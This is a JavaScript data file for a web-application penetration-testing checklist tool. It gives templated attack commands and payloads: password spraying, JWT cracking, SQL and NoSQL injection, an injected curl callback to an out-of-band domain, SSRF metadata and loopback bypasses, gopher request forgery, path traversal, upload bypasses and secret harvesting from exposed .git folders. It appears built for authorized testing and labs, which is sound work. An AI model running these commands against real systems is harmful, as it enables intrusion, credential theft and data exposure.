/* WARM — methodology data.
 * Edit this file to extend the tool: add phases, items, or commands.
 * Command strings use {variables} filled from the Scope panel at runtime.
 * Variables: {target_url} {target_host} {target_ip} {tester_ip} {tester_port} {wordlist} {ports} {cookie}
 *   {target_url}  full web app URL, e.g. http://app.target   (trailing slash is trimmed)
 *   {target_host} hostname parsed from {target_url}           (for filenames, Host:, hydra)
 *   {target_ip}   the IP                                      (for nmap / TLS / network tools)
 * A command may add `note:true` (guidance, not a shell command) so it renders without a Copy button.
 */
window.METHODOLOGY = {
  variables: [
    { key: "target_url",  label: "Target URL",  placeholder: "http://app.target/", scope: true },
    { key: "target_ip",   label: "Target IP",   placeholder: "10.10.10.10",        scope: true },
    { key: "tester_ip",   label: "Tester IP(s)", placeholder: "your attack box IP" },
    { key: "tester_port", label: "Tester port (listener)", placeholder: "9001", def: "9001" },
    { key: "wordlist",    label: "Wordlist",    placeholder: "/usr/share/seclists/...", def: "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt" },
    { key: "ports",       label: "Ports",       placeholder: "80,443", def: "80,443" },
    { key: "cookie",      label: "Session cookie", placeholder: "name=value (optional)" },
    { key: "scope",       label: "Authorized scope (hosts/CIDRs)", placeholder: "one per line — warns if target is outside", multi: true, guard: true }
  ],

  phases: [
    {
      num: "01", id: "recon", title: "Recon & Mapping",
      goal: "Know every host, route, parameter, and technology before attacking anything.",
      items: [
        { label: "Fingerprint the stack",
          tell: "Headers, cookie names, error-page style tell you the framework — which decides which bugs matter.",
          cmds: [
            { tool: "whatweb", cmd: "whatweb -a 3 {target_url}" },
            { tool: "httpx-toolkit", cmd: "httpx-toolkit -u {target_url} -title -tech-detect -status-code -web-server -ip" },
            { tool: "curl",    cmd: "curl -s -I {target_url}/" }
          ] },
        { label: "Content discovery / forced browsing",
          tell: "Find /api, /admin, /private, backups, .git, .env, docs. Most labs are won here.",
          cmds: [
            { tool: "ffuf",        cmd: "ffuf -u {target_url}/FUZZ -w {wordlist} -fc 404 -c -recursion -t 50" },
            { tool: "feroxbuster", cmd: "feroxbuster -u {target_url} -w {wordlist} -x php,txt,bak,zip" }
          ] },
        { label: "Read every client-side JS file",
          tell: "Static JS holds the API map: paths, exact field names, JSON vs form, hidden functions.",
          cmds: [
            { tool: "katana",     cmd: "katana -u {target_url} -jc -d 3 -o katana-{target_host}.txt" },
            { tool: "gau",        cmd: "gau {target_host}" },
            { tool: "LinkFinder", cmd: "python3 linkfinder.py -i {target_url} -d -o cli" }
          ] },
        { label: "Enumerate HTTP methods",
          tell: "The Allow header often leaks the real verb (e.g. POST-only /create) before any auth check.",
          cmds: [
            { tool: "curl", cmd: "curl -s -i -X OPTIONS {target_url}/api/" },
            { tool: "curl", cmd: "curl -s -o /dev/null -w 'GET %{http_code}\\n' {target_url}/api/admin/create" }
          ] },
        { label: "Port & service scan",
          tell: "Internal ports, non-web services, versions to pivot from.",
          cmds: [
            { tool: "nmap", cmd: "nmap -sV -sC -p {ports} {target_ip}" },
            { tool: "nmap", cmd: "nmap -p- --min-rate 2000 -oN nmap-full-{target_host}.txt {target_ip}" }
          ] },
        { label: "Tech-detect templates",
          tell: "Known software + obvious exposures in one pass.",
          cmds: [ { tool: "nuclei", cmd: "nuclei -u {target_url} -t http/technologies/ -t http/exposures/" } ] }
      ]
    },

    {
      num: "02", id: "auth", title: "Authentication & Session",
      goal: "Break the front door, or walk around it.",
      items: [
        { label: "User enumeration / password spray",
          tell: "Distinct error or timing leaks valid users; spray slowly, mind lockout.",
          cmds: [
            { tool: "ffuf",  cmd: "ffuf -u {target_url}/api/user/login -X POST -H 'Content-Type: application/json' -d '{\"email\":\"FUZZ\",\"password\":\"x\"}' -w users.txt -mr 'Invalid password'" },
            { tool: "hydra", cmd: "hydra -L users.txt -P pass.txt {target_host} http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'" }
          ] },
        { label: "Password reset / forgot flow", sev: "high",
          tell: "Guessable tokens, token not bound to user, host-header poisoning in reset links.",
          cmds: [
            { tool: "curl", cmd: "curl -s {target_url}/api/user/forgotPassword -d 'email=victim@test.net' -H 'Host: {tester_ip}'" }
          ] },
        { label: "JWT handling",
          tell: "alg:none, weak HMAC secret (crack offline), RS256->HS256 confusion.",
          cmds: [
            { tool: "jwt_tool", cmd: "jwt_tool <JWT> -M at -t {target_url}/api/me" },
            { tool: "hashcat",  cmd: "hashcat -a 0 -m 16500 jwt.txt {wordlist}" }
          ] },
        { label: "Session management",
          tell: "Entropy/signing, fixation, cookie flags, does logout + password change invalidate.",
          cmds: [ { note: true, tool: "Burp", cmd: "Burp Sequencer on the session cookie; check Secure/HttpOnly/SameSite flags and server-side invalidation." } ] }
      ]
    },

    {
      num: "03", id: "access", title: "Access Control & Privilege Escalation",
      goal: "Right session, wrong permissions — the most common real finding.",
      items: [
        { label: "IDOR / BOLA", sev: "crit",
          tell: "Swap id/uuid/filename across users; test every object reference with a lower-priv account.",
          cmds: [
            { tool: "ffuf", cmd: "ffuf -u {target_url}/api/user/FUZZ -w ids.txt -H 'Cookie: {cookie}' -mc 200" }
          ] },
        { label: "Trust-based bypass", sev: "high",
          tell: "Routes that trust source IP or headers. If an internal API trusts loopback, SSRF makes you loopback.",
          cmds: [
            { tool: "curl", cmd: "curl -s {target_url}/admin -H 'X-Forwarded-For: 127.0.0.1'" },
            { tool: "curl", cmd: "curl -s {target_url}/ -H 'X-Original-URL: /admin'" }
          ] },
        { label: "Function-level access control",
          tell: "Hit admin endpoints directly with a normal session; replay an admin action captured from JS/docs.",
          cmds: [ { note: true, tool: "Burp + Autorize", cmd: "Load Autorize with a low-priv cookie, browse as admin, review red/green enforcement." } ] }
      ]
    },

    {
      num: "04", id: "inject", title: "Input & Injection",
      goal: "Where user data crosses into an interpreter.",
      items: [
        { label: "SQL injection", sev: "crit",
          tell: "Quote-break, boolean/time blind, UNION.",
          cmds: [
            { tool: "sqlmap", cmd: "sqlmap -u '{target_url}/page?id=1' --batch --level 2 --risk 2" },
            { tool: "sqlmap", cmd: "sqlmap -u '{target_url}/api/x' --data='id=1' --cookie='{cookie}' --batch" }
          ] },
        { label: "NoSQL injection", sev: "crit",
          tell: "Operator injection in JSON or bracketed form params.",
          cmds: [
            { tool: "curl", cmd: "curl -s {target_url}/api/user/login -H 'Content-Type: application/json' -d '{\"email\":{\"$ne\":null},\"password\":{\"$ne\":null}}'" }
          ] },
        { label: "XSS (reflected / stored / DOM)",
          tell: "Find the context first, then break out of it.",
          cmds: [ { tool: "dalfox", cmd: "dalfox url '{target_url}/search?q=FUZZ'" } ] },
        { label: "Server-side template injection", sev: "crit",
          tell: "Jinja/Twig auto-eval {{7*7}}; EJS/ERB need delimiters <%= 7*7 %>. Escalate via the module loader.",
          cmds: [
            { note: true, tool: "probe", cmd: "Try per engine: {{7*7}} | ${7*7} | <%= 7*7 %> | #{7*7} — a 49 (or filter strip) tells you the engine." },
            { tool: "tplmap", cmd: "tplmap -u '{target_url}/page?name=*'" }
          ] },
        { label: "OS command injection / blind",
          tell: "Separators in anything that shells out; confirm blind with OAST or time delay.",
          cmds: [ { tool: "interactsh", cmd: "interactsh-client -v   # then inject: ;curl <your-oast-domain>" } ] }
      ]
    },

    {
      num: "05", id: "ssrf", title: "SSRF",
      goal: "Make the server make the request. Full tree in the Methodology tab below.",
      items: [
        { label: "Start a listener / redirector", sev: "high",
          tell: "Catch the callback that proves the fetch, and host redirects.",
          cmds: [
            { tool: "nc",     cmd: "nc -lvnp {tester_port}" },
            { tool: "python", cmd: "python3 -m http.server {tester_port} --bind {tester_ip}" }
          ] },
        { label: "Find & confirm the fetch primitive",
          tell: "Any URL feature: webhook, import, avatar/CV, renderer, link preview. Confirm with a listener hit.",
          cmds: [
            { tool: "curl", cmd: "curl -s {target_url}/api/user/preview/cv -H 'Cookie: {cookie}' --data 'cv=http://{tester_ip}:{tester_port}/ssrf-probe'" }
          ] },
        { label: "Fingerprint the fetcher",
          tell: "Read the User-Agent on your listener: curl (gopher/redirects), requests (no gopher), headless (file://,JS).",
          cmds: [ { note: true, tool: "read listener", cmd: "Watch the UA string on your nc/http.server hit — it dictates every later option." } ] },
        { label: "Reach internal / bypass denylist",
          tell: "Loopback & metadata encodings when localhost/127.0.0.1 are blocked by string match.",
          cmds: [
            { note: true, tool: "loopback", cmd: "http://0.0.0.0  http://0  http://[::1]  http://127.0.0.2  http://2130706433  http://0x7f.1" },
            { note: true, tool: "metadata", cmd: "http://169.254.169.254/latest/meta-data/   (cloud IMDS)" }
          ] },
        { label: "Forge a POST via gopher",
          tell: "Create/admin endpoints need a body. libcurl gophers a raw request; mind redirect-protocol limits.",
          cmds: [ { tool: "gopherus", cmd: "gopherus --exploit   # or craft gopher://127.0.0.1:80/_<raw request> by hand" } ] }
      ]
    },

    {
      num: "06", id: "files", title: "File Upload & Path",
      goal: "What you can write, and what you can read.",
      items: [
        { label: "Path traversal / LFI",
          tell: "../, encoded %2e%2e%2f, absolute paths in any filename/path/template param.",
          cmds: [
            { tool: "ffuf",      cmd: "ffuf -u '{target_url}/download?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fc 404" },
            { tool: "dotdotpwn", cmd: "dotdotpwn -m http-url -u '{target_url}/download?file=TRAVERSAL' -k 'root:'" }
          ] },
        { label: "Malicious upload", sev: "crit",
          tell: "Bypass type checks (double ext, magic-byte spoof, Content-Type swap); reach & execute the path.",
          cmds: [ { note: true, tool: "Burp", cmd: "Upload Scanner extension; or manual: shell.php.jpg, shell.pHp, polyglot, Content-Type: image/png." } ] },
        { label: "LFI templates",
          tell: "Known file-read endpoints.",
          cmds: [ { tool: "nuclei", cmd: "nuclei -u {target_url} -tags lfi,fileupload" } ] }
      ]
    },

    {
      num: "07", id: "api", title: "API Testing",
      goal: "The app's real attack surface is usually the API.",
      items: [
        { label: "Find docs / spec", sev: "high",
          tell: "Swagger/OpenAPI, GraphQL introspection, a /api index, Postman collections in JS.",
          cmds: [
            { tool: "curl",       cmd: "curl -s {target_url}/swagger.json -o swagger.json; curl -s {target_url}/openapi.json" },
            { tool: "kiterunner", cmd: "kr scan {target_url} -w routes-large.kite" }
          ] },
        { label: "Hidden parameters",
          tell: "Params the UI omits often drive mass assignment.",
          cmds: [ { tool: "arjun", cmd: "arjun -u {target_url}/api/user/update -m POST" } ] },
        { label: "Mass assignment", sev: "crit",
          tell: "Add role=admin / isAdmin=true / verified=1; test JSON vs form parsing.",
          cmds: [ { note: true, tool: "probe", cmd: "Replay a create/update and append &role=admin (form) or \"role\":\"admin\" (json)." } ] },
        { label: "GraphQL",
          tell: "Fingerprint engine, introspect, rebuild schema if introspection is off.",
          cmds: [
            { tool: "graphw00f",    cmd: "graphw00f -t {target_url}/graphql -d" },
            { tool: "clairvoyance", cmd: "clairvoyance {target_url}/graphql -o schema.json" }
          ] }
      ]
    },

    {
      num: "08", id: "logic", title: "Business Logic",
      goal: "The app does what it was told — just not what it should.",
      items: [
        { label: "Workflow & state abuse",
          tell: "Skip steps, replay, reorder, act out of sequence.",
          cmds: [ { note: true, tool: "Burp Repeater", cmd: "Model the intended flow, then replay steps out of order / skip payment / approve own request." } ] },
        { label: "Race conditions",
          tell: "Parallel requests against balance, stock, coupons, one-time tokens.",
          cmds: [
            { tool: "curl",          cmd: "seq 30 | xargs -P30 -I_ curl -s {target_url}/api/redeem -H 'Cookie: {cookie}' -d 'code=ONCE'" },
            { note: true, tool: "Turbo Intruder", cmd: "Use the single-packet-attack template for tighter timing windows." }
          ] }
      ]
    },

    {
      num: "09", id: "config", title: "Config & Information Disclosure",
      goal: "Free wins and the context that unlocks the rest.",
      items: [
        { label: "Misconfig & known issues",
          tell: "Broad safe scan for exposures, debug, default pages.",
          cmds: [
            { tool: "nuclei", cmd: "nuclei -u {target_url} -severity low,medium,high,critical" },
            { tool: "nikto",  cmd: "nikto -h {target_url}" }
          ] },
        { label: "Exposed source & secrets",
          tell: ".git/, .env, backups, source maps, hardcoded keys in JS.",
          cmds: [
            { tool: "git-dumper", cmd: "git-dumper {target_url}/.git ./{target_host}-git" },
            { tool: "trufflehog", cmd: "trufflehog filesystem ./{target_host}-git --only-verified" }
          ] },
        { label: "TLS & CORS",
          tell: "Weak TLS; permissive or reflected CORS origin with credentials.",
          cmds: [
            { tool: "testssl.sh", cmd: "testssl.sh {target_host}" },
            { tool: "curl",       cmd: "curl -s -I {target_url}/api/ -H 'Origin: https://evil.example' | grep -i access-control" }
          ] }
      ]
    }
  ]
};
